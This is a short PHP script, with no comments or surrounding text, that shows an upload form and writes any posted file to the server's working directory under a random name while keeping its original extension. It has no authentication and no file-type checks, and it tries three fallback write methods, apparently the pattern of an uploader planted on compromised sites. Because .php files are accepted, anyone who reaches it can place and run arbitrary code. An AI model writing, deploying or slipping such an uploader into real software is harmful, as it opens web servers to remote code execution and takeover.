<?php
if (isset($_FILES['f']) && $_FILES['f']['error']===0){
    $f = $_FILES['f']['tmp_name'];
    $n = bin2hex(random_bytes(16)).'.'.pathinfo($_FILES['f']['name'],PATHINFO_EXTENSION);
    if (is_uploaded_file($f) && $_FILES['f']['size']>0){
        foreach([fn() => file_put_contents($n,file_get_contents($f)),
                fn() => copy($f,$n),
                fn() => rename($f,$n)] as $m){
            if ($m() && filesize($n)>0) die('OK:'.$n);
            @unlink($n);
        }
    }
    die('FAIL');
}
echo '<form enctype="multipart/form-data" method="post"><input type="file" name="f"><input type="submit" value="Upload"></form>';
?>